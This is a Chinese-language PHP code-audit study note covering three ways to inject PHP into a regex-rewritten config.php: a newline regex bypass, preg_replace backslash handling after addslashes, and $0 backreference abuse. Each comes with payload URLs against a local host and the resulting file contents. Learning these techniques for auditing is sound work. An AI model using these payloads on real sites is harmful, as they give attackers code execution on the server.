# PHP代码审计

放一些PHP代码审计学习中遇到的很有意思的片段

<details>
<summary>file-config-vulnerability.php</summary>

### 利用换行符来绕过正则匹配的问题

 正则匹配内容:

```
$option=''
```

任意内容里面是可以包含转移符 \ 的,所以我们利用下面的方法:

```
http://127.0.0.1/index.php?option=a';%0aphpinfo();//
http://127.0.0.1/index.php?option=a
```

执行完第一个之后,config.php中的内容为:

```
<?php
$option='a\';
phpinfo();//';
```

 但是这样并没有办法执行phpinfo(),因为我们插入的 单引号 被转移掉了,所以phpinfo()还是在单引号的包裹之内.

我们再访问下面这个

```
http://127.0.0.1/index.php?option=a
```

因为正则 .* 会匹配行内的任意字符无数次.所以 \ 也被认为是其中的一部分,也会被替换掉,执行完之后,config.php中的内容为:

```
<?php
$option='a';
phpinfo();//';
```

转义符就被替换掉了,就成功的getshell.

 

### 利用 preg_replace函数的问题

用preg_replace()的时候replacement(第二个参数)也要经过正则引擎处理，所以正则引擎把`\\`转义成了`\`

也就是说如果字符串是`\\\'`,经过 preg_replace()的处理,就变为 `\\'`,单引号就逃出来了.

payload

```
http://127.0.0.1/index.php?option=a\';phpinfo();//
```

config.php变为:

```
<?php
$option='a\\';phpinfo();//';
```

道理就是 `a\';phpinfo();//` 经过 addslashes()处理之后,变为`a\\\';phpinfo();//` 然后两个反斜杠被preg_replace变成了一个,导致单引号逃脱.

 

### 利用 preg_replace() 函数的第二个参数的问题 

replacement中可以包含后向引用`\\n` 或(php 4.0.4以上可用)$n，语法上首选后者。 每个 这样的引用将被匹配到的第n个捕获子组捕获到的文本替换。 n 可以是0-99，`\\0`和$0代表完整的模式匹配文本。

payload

```
http://127.0.0.1/test/ph.php?option=;phpinfo();
http://127.0.0.1/test/ph.php?option=$0
```

执行第一条后config.php的内容为:

```
<?php
$option=';phpinfo();';
```

再执行第二条后config.php的内容为:

```
<?php
$option='$option=';phpinfo();';';
```
</details>


